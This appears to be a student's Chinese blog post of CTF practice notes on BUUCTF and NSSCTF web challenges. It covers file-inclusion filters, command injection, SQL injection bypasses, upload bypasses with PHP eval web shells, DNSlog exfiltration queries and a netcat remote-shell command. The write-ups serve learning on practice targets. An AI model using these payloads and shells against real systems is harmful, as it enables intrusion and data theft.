<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>休比大王 | 休比大王</title><meta name="author" content="xiubi"><meta name="copyright" content="xiubi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="buuctf复现[ACTF2020 新生赛]Include 思路只到可以访问敏感文件 想到要用文件包含 php伪协议支持伪协议的函数（文件包含函数） 1234include();引入了一个其他文件到include所在的那个文件里面 源码中有include函数 可以理解为传入的参数可以在后台被成功运行include_once();require();require_once();  以 php:&#x2F;&#x2F;">
<meta property="og:type" content="article">
<meta property="og:title" content="休比大王">
<meta property="og:url" content="https://xiubi1125.github.io/2025/05/30/buuctf/index.html">
<meta property="og:site_name" content="休比大王">
<meta property="og:description" content="buuctf复现[ACTF2020 新生赛]Include 思路只到可以访问敏感文件 想到要用文件包含 php伪协议支持伪协议的函数（文件包含函数） 1234include();引入了一个其他文件到include所在的那个文件里面 源码中有include函数 可以理解为传入的参数可以在后台被成功运行include_once();require();require_once();  以 php:&#x2F;&#x2F;">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://xiubi1125.github.io/img/qz.jpg">
<meta property="article:published_time" content="2025-05-29T21:46:56.535Z">
<meta property="article:modified_time" content="2025-05-28T14:22:05.524Z">
<meta property="article:author" content="xiubi">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://xiubi1125.github.io/img/qz.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "",
  "url": "https://xiubi1125.github.io/2025/05/30/buuctf/",
  "image": "https://xiubi1125.github.io/img/qz.jpg",
  "datePublished": "2025-05-29T21:46:56.535Z",
  "dateModified": "2025-05-28T14:22:05.524Z",
  "author": [
    {
      "@type": "Person",
      "name": "xiubi",
      "url": "https://xiubi1125.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://xiubi1125.github.io/2025/05/30/buuctf/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '休比大王',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="休比大王" type="application/atom+xml">
</head><body><div id="web_bg" style="background-image: url(/img/qz.jpg);"></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/qz.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">休比大王</span></a><a class="nav-page-title" href="/"><span class="site-name">休比大王</span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">无标题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-05-29T21:46:56.535Z" title="发表于 2025-05-30 05:46:56">2025-05-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-05-28T14:22:05.524Z" title="更新于 2025-05-28 22:22:05">2025-05-28</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="buuctf复现"><a href="#buuctf复现" class="headerlink" title="buuctf复现"></a>buuctf复现</h1><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p><img src="C:\Users\xiubi\AppData\Roaming\Typora\typora-user-images\image-20250509192612579.png" alt="image-20250509192612579"></p>
<p>思路只到可以访问敏感文件 想到要用文件包含</p>
<h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><p>支持伪协议的函数（文件包含函数）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">include();引入了一个其他文件到include所在的那个文件里面 源码中有include函数 可以理解为传入的参数可以在后台被成功运行</span><br><span class="line">include_once();</span><br><span class="line">require();</span><br><span class="line">require_once();</span><br></pre></td></tr></table></figure>

<p>以 <code>php://</code> 开头，后面跟着一些参数，用于指定 <code>要执行的操作</code> 或 <code>需要访问的资源</code>。<code>php://filter</code> 的主要作用是提供一种机制，让您可以轻松地 <code>在数据流上应用一个或多个过滤器</code>。</p>
<p>基本格式<u>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;?&#x2F;resource&#x3D;?</p>
<p>php:&#x2F;&#x2F;filter是一种元封装器，是PHP中特有的协议流，设计用于数据流打开时的筛选过滤应用，作用是作为一个“中间流”来处理其他流。php:&#x2F;&#x2F;filter目标使用以下的参数作为它路径的一部分。复合过滤链能够在一个路径上指定。是php提供的一个伪协议</p>
<p><img src="C:\Users\xiubi\AppData\Roaming\Typora\typora-user-images\image-20250509193856043.png" alt="image-20250509193856043"></p>
<p>?a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;1.php（php伪协议可以理解为是一段可以读取php文件内容的代码）</p>
<p>convert.base64-encode—–是一个过滤器 将通过该伪协议得到的资源数据进行base64编码处理 </p>
<p>resource————————-用来指定要操作的目标资源 也就是要读取的文件</p>
<p>base64编码的一个特点是后面有&#x3D;</p>
<h2 id="ACTF2020新生赛-Exec"><a href="#ACTF2020新生赛-Exec" class="headerlink" title="[ACTF2020新生赛]Exec"></a>[ACTF2020新生赛]Exec</h2><p>考的是命令注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">一些知识点</span><br><span class="line">1、命令注入我们要防备其对于一些符号的过滤导致我们不能成功注入，所以我们要多了解一些符号。</span><br><span class="line">2、;直接分号分隔</span><br><span class="line">管道符：作用和&amp;一样。前面和后面命令都要执行，无论前面真假</span><br><span class="line">3、| 按位或</span><br><span class="line">作用是直接执行|后面的语句</span><br><span class="line">4、|| 逻辑或</span><br><span class="line">作用是如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">5、&amp; 按位与</span><br><span class="line">&amp;前面和后面命令都要执行，无论前面真假</span><br><span class="line">6、&amp;&amp; 逻辑与</span><br><span class="line">如果前面为假，后面的命令就不执行，如果前面为真则再执行后面命令，这样两条命令都会被执行</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>简单的命令注入 不存在什么过滤 直接ping一个127.0.0.1;ls发现没有过滤; 尝试在本机地址之后加上命令 比如ls  </p>
<p>跨一些目录 ..&#x2F;..&#x2F;..&#x2F;..&#x2F;查看之后发现有flag文件 cat直接读取</p>
<h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>这个过滤的东西好像变多了 不能直接cat</p>
<p>首先cat flag.php 发现空格被过滤了</p>
<p><img src="C:\Users\xiubi\AppData\Roaming\Typora\typora-user-images\image-20250513200819143.png" alt="image-20250513200819143"></p>
<p>?ip&#x3D;127.0.0.1;cat$IFS$9<code>ls</code></p>
<p>反引号的作用：把反引号里面内容的输出当作输入来执行</p>
<p><img src="C:\Users\xiubi\AppData\Roaming\Typora\typora-user-images\image-20250513203355620.png"></p>
<p>注意一下回显之后没有内容 看一眼源代码里面的注释信息</p>
<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>堆叠注入</p>
<p>1’; show databases;</p>
<p>大概就是在一个分号后面再加上命令堆叠执行</p>
<p><code>sql_mode</code> 是 MySQL 中的一个重要系统变量，它定义了 MySQL 应该如何解析和执行 SQL 语句，影响着 SQL 语法的使用规则、<strong>数据的处理方式等</strong></p>
<p>  语句为set sql_mode&#x3D;PIPES_AS_CONCAT </p>
<p>当启用 <code>PIPES_AS_CONCAT</code> 模式后，MySQL 会将 <code>||</code> 解释为字符串连接操作符，与 Oracle 和 PostgreSQL 保持一致</p>
<p>1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1</p>
<p>*；1（两种解法）</p>
<p>其实不是很懂什么意思</p>
<h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>比较普通的sql注入题目 </p>
<p>刚开始登陆的时候用万能密码1’ or ‘1’&#x3D;1–+ 不能成功登录 注释符必须是#</p>
<p><img src="C:\Users\xiubi\AppData\Roaming\Typora\typora-user-images\image-20250519183922484.png" alt="image-20250519183922484"></p>
<ul>
<li><p><strong>MySQL</strong>：两种都可用，但 <code>--+</code> 更保险（防止部分配置下 <code>--</code> 后无空格报错）。</p>
</li>
<li><p><strong>PostgreSQL&#x2F;SQLite</strong>：推荐使用 <code>#</code>，更符合语法习惯。</p>
<p>这道题只能用#</p>
<h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>我的思路是到了这里 感觉后面应该是越权访问上级目录</p>
</li>
</ul>
<p><img src="C:\Users\xiubi\AppData\Roaming\Typora\typora-user-images\image-20250519185422144.png" alt="image-20250519185422144"></p>
<p><img src="C:\Users\xiubi\AppData\Roaming\Typora\typora-user-images\image-20250519185523296.png" alt="image-20250519185523296"></p>
<p>其实不是&#x3D;-&#x3D; 没啥思路抓包看到有隐藏的php文件（就是在注释里面 但是需要到repeter里send才能看到所以一开始没找到）</p>
<p><img src="C:\Users\xiubi\AppData\Roaming\Typora\typora-user-images\image-20250520181210127.png" alt="image-20250520181210127"></p>
<p>php代码审计</p>
<p><img src="C:\Users\xiubi\AppData\Roaming\Typora\typora-user-images\image-20250520182611626.png" alt="image-20250520182611626"></p>
<p>​                 </p>
<p><img src="C:\Users\xiubi\AppData\Roaming\Typora\typora-user-images\image-20250520182457455.png" alt="image-20250520182457455"></p>
<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>select一被禁用，<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2&spm=1001.2101.3001.7020">联合查询</a>，报错注入，布尔,时间盲注就都不可以使用了。我们只剩下了堆叠注入。</p>
<p>?inject&#x3D;1’; show columns from <code>words</code>– q</p>
<p>关于在这里使用 &#96; 而不是 ’ 的一些解释：</p>
<p>两者在linux下和windows下不同，linux下不区分，windows下区分。</p>
<p>单引号 ’ 或双引号主要用于 字符串的引用符号</p>
<p>反勾号 &#96; 数据库、表、索引、列和别名用的是引用符是反勾号 (注：Esc下面的键)</p>
<p>有MYSQL保留字作为字段的，必须加上反引号来区分！！！</p>
<p>如果是数值，请不要使用引号      <strong>表名是纯数字需要用反引号包裹</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string">SET @a = 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;</span></span><br><span class="line"><span class="string">PREPARE execsql FROM @a;</span></span><br><span class="line"><span class="string">EXECUTE execsql;</span></span><br><span class="line"><span class="string">#</span></span><br></pre></td></tr></table></figure>



<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p><strong>phtml一般是指嵌入了php代码的html文件，但是同样也会作为php解析</strong></p>
<p>GIF89a?幻术头</p>
<p>在一些文件上传场景中，服务器可能会检查文件的类型。如果需要上传非图片类型的文件（如包含代码的脚本文件），但服务器限制只能上传图片文件，可以在文件开头添加 GIF89a 这个文件头，将文件伪装成 GIF 图片，以绕过简单的文件类型检查</p>
<h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p><img src="C:\Users\xiubi\AppData\Roaming\Typora\typora-user-images\image-20250527175846341.png" alt="image-20250527175846341"></p>
<p>找到了文件上传路径蚁剑连接不上 有.&#x2F;考虑到目录穿越 下一步卡住的</p>
<p>还是前面的phtml 抓包改后缀为php会限制所以前端后端都有检验</p>
<p><strong>PHTML</strong> 是一种文件扩展名，主要用于将 PHP 代码嵌入到 HTML 文件中。它使得在 HTML 文件中使用 PHP 代码变得更加简单和易于维护。</p>
<p>写法：</p>
<script language='php'>@eval($_POST['a']);</script>

<script language='php'>system('cat /flag');</script>

<p>写进去之后删除前端检验进行上传然后直接访问该phtml文件就能看到flag</p>
<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>用的是双写绕过?username&#x3D;1%27ununionion%20seselectlect%201,2,3%23&amp;password&#x3D;1</p>
<p>union&#x2F;select都被过滤了（因为错误回显里输入进去的union什么的都没了所以知道是被替代成了空白）</p>
<p>这道题最明显的是双写绕过，然后我们需要去拼接双写语句达到绕过的目的，双写的方式也不一定是固定的，这道题在我们尝试的时候也会发现其实它也过滤好几个单词，有时候我们需要部分双写，也不需要整个单词双写，因为它不是整个单词都过滤</p>
<p>1’ ununionion seselectlect 1,2,<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=group_concat&spm=1001.2101.3001.7020">group_concat</a>(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema&#x3D;’geek’#</p>
<p>1’ ununionion selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name&#x3D;’b4bsql’#</p>
<p>1’ ununionion selselectect 1,2,group_concat(username,id,passwoorrd) frfromom geek.b4bsql#</p>
<p>#要url编码 因为#是个锚点可以跳转目录</p>
<p>这里不能用#注释！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！</p>
<h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>常见的网站源码备份文件后缀:</p>
<p>tar.gz，zip，rar，tar</p>
<p>常见的网站源码备份文件名：</p>
<p>web，website，backup，back，www，wwwroot，temp</p>
<p>php反序列化 学起来有点吃力 先放一下</p>
<h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>首先 这题目给了提示是备份文件</p>
<p>不知道为什么我的dirsearch扫描出来不高亮显示 试出来备份文件是index.php.bak</p>
<p>然后是个代码审计</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;key&#x27;])) &#123;</span><br><span class="line">    $key = $_GET[&#x27;key&#x27;];</span><br><span class="line">    if(!is_numeric($key)) &#123;</span><br><span class="line">        exit(&quot;Just num!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = &quot;bc1q3yz7qs5dvm3l249rjqg393qfjddzev37cp84e3&quot;;</span><br><span class="line">    if($key == $str) &#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo &quot;Try to find out source file!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其实很容易看出来 让key&#x3D;</p>
<p><img src="C:\Users\xiubi\AppData\Roaming\Typora\typora-user-images\image-20250528212915542.png" alt="image-20250528212915542"></p>
<p>不知道为什么这里复制下来值不一样 涉及一个<u>弱类型比较</u></p>
<p>在PHP中：<br>&#x3D; &#x3D; 为弱相等，即当整数和字符串类型相比较时。会先将字符串转化为整数然后再进行比较。比如a&#x3D;123和b&#x3D;123admin456进行&#x3D; &#x3D;比较时。则b只会截取前面的整数部分。即b转化成123。<br>所以，这里的a &#x3D; &#x3D; b是返回True。<br>所以这里我们只需要提供一个参数?key&#x3D;123就可以拿到flag了</p>
<h2 id="组会的东西"><a href="#组会的东西" class="headerlink" title="组会的东西"></a>组会的东西</h2><p><img src="C:\Users\xiubi\AppData\Roaming\Typora\typora-user-images\image-20250514214409000.png" alt="image-20250514214409000"></p>
<p>碰到无回显的命令执行漏洞，可以通过dnslog外带来获取命令执行后的结果，从而方便我们来判断命令是否执行成功以及进行更深层次的利用。</p>
<p>原理将需要查询的值和域名拼接起来，向域名发送请求，DNS在解析的时候会留下日志，读取日志便可以获取信息。</p>
<p>select load_file(cocat(‘\\\‘,(select database()),’.dnslog.cn\abc’));(比盲注简单)</p>
<p>‘ and if((select load_file(concat(‘\\‘,(select database()),’.xxxxx.ceye.io\abc’))),1,0)– -+</p>
<p>and (select load_file(concat(“&#x2F;&#x2F;“,(select database()),”.域名”))) –+</p>
<p><img src="C:\Users\xiubi\AppData\Roaming\Typora\typora-user-images\image-20250515230455587.png" alt="image-20250515230455587"></p>
<p>nc.exe -l -p 4444 -e cmd.exe创建客户端10.204.76.197</p>
<p>nc 192.         4444</p>
<h1 id="NSS复现"><a href="#NSS复现" class="headerlink" title="NSS复现"></a>NSS复现</h1><h2 id="LitCTF-2025-easy-file"><a href="#LitCTF-2025-easy-file" class="headerlink" title="[LitCTF 2025]easy_file"></a>[LitCTF 2025]easy_file</h2><p>随便输个用户名登录发现被编码了 看见&#x3D;就想到是base64</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@``eval``($_POST[123456]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://xiubi1125.github.io">xiubi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://xiubi1125.github.io/2025/05/30/buuctf/">https://xiubi1125.github.io/2025/05/30/buuctf/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://xiubi1125.github.io" target="_blank">休比大王</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/qz.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/05/11/hello-world/" title="Hello World"><img class="cover" src="/img/qz.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Hello World</div></div><div class="info-2"><div class="info-item-1">Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot;  More info: Writing Run server1$ hexo server  More info: Server Generate static files1$ hexo generate  More info: Generating Deploy to remote sites1$ hexo deploy  More info: Deployment </div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/tx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">xiubi</div><div class="author-info-description">或许最低落笔峰都能与光相逢</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#buuctf%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">buuctf复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include"><span class="toc-number">1.1.</span> <span class="toc-text">[ACTF2020 新生赛]Include</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.1.1.</span> <span class="toc-text">php伪协议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Exec"><span class="toc-number">1.2.</span> <span class="toc-text">[ACTF2020新生赛]Exec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="toc-number">1.3.</span> <span class="toc-text">[GXYCTF2019]Ping Ping Ping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUCTF-2019-EasySQL"><span class="toc-number">1.4.</span> <span class="toc-text">[SUCTF 2019]EasySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL"><span class="toc-number">1.5.</span> <span class="toc-text">[极客大挑战 2019]LoveSQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File"><span class="toc-number">1.6.</span> <span class="toc-text">[极客大挑战 2019]Secret File</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">1.7.</span> <span class="toc-text">[强网杯 2019]随便注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload"><span class="toc-number">1.8.</span> <span class="toc-text">[极客大挑战 2019]Upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload"><span class="toc-number">1.9.</span> <span class="toc-text">[ACTF2020 新生赛]Upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL"><span class="toc-number">1.10.</span> <span class="toc-text">[极客大挑战 2019]BabySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP"><span class="toc-number">1.11.</span> <span class="toc-text">[极客大挑战 2019]PHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-BackupFile"><span class="toc-number">1.12.</span> <span class="toc-text">[ACTF2020 新生赛]BackupFile</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%84%E4%BC%9A%E7%9A%84%E4%B8%9C%E8%A5%BF"><span class="toc-number">1.13.</span> <span class="toc-text">组会的东西</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NSS%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.</span> <span class="toc-text">NSS复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#LitCTF-2025-easy-file"><span class="toc-number">2.1.</span> <span class="toc-text">[LitCTF 2025]easy_file</span></a></li></ol></li></ol></div></div><div class="card-widget 